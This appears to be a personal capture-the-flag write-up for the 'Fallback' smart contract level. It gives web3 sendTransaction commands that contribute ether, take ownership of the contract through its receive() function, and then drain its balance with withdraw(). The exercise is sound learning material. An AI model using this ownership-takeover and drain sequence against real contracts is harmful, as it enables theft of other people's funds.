Fallback
Difficulty 1/10

Look carefully at the contract's code below.

You will beat this level if

you claim ownership of the contract
you reduce its balance to 0

First thing I gotta do is to make sure that I get the ownership of the contract.
To get the ownership of the contract, I need to call receive() function.
Receive function is triggered when sending transactions without any data.
but in the require of receive() function, I need to have more than 0 value in
contributions mapping. So I need to first sendTransaction using contribute() function.
Since I will be using sendTransaction() method of web3.js, I need to first send ethers
to the smart contract when calling contribute() and the function's information needs to be inside the options as ABI bytes string.

So I will try. 

or, maybe the signature from abi object will do its job?
need to try.
hm.. transaction was mined when I sent Transaction as

    sendTransaction({from : "0x14a5b8f7DF340D89F3f7609dedCcE79a416E946c"  ,to: "0x51117C321d073fAC2bf4b89c10104F10624f39df", value: toWei("0.0001"), data : "0xd7bb99ba"}).then(function(receipt){
        console.log(receipt);
    });

I will have to check contributions mapping to see if my contribution really went through.

    await contract.contributions("0x14a5b8f7DF340D89F3f7609dedCcE79a416E946c");

returns an array words lengh of 2. Let's just continue.

    sendTransaction({from : "0x14a5b8f7DF340D89F3f7609dedCcE79a416E946c"  ,to: "0x51117C321d073fAC2bf4b89c10104F10624f39df", value: toWei("0.001")}).then(function(receipt){
        console.log(receipt);
    });

Transaction mined. Now let's check the owner of the contract.

    await contract.owner();
    "0x14a5b8f7DF340D89F3f7609dedCcE79a416E946c"

Yep, I am the owner.
Challenge solved.

Ah, shit. I need to drain the contract.

    contract.withdraw();

Alright, level solved.

So, it seems like when I sendTransactions, I don't neccessarily have to put a whole a lot of big and long abi
in the data. Just need to use signature from the abi object. I didn't know this cuz usually when I call
function in ethers.js, making a instance of a contract and calling functions with its name was common.

Sending ethers to the contract calling contribute() function;

    sendTransaction({from : "0x14a5b8f7DF340D89F3f7609dedCcE79a416E946c"  ,to: "0x51117C321d073fAC2bf4b89c10104F10624f39df", value: toWei("0.0001"), data : "0xd7bb99ba"}).then(function(receipt){
        console.log(receipt);
    });

Sending ethers to the contract triggering receive()

    sendTransaction({from : "0x14a5b8f7DF340D89F3f7609dedCcE79a416E946c" ,to: "0x51117C321d073fAC2bf4b89c10104F10624f39df", value: toWei("0.001"), data: ""}).then(function(receipt){
        console.log(receipt);
    });
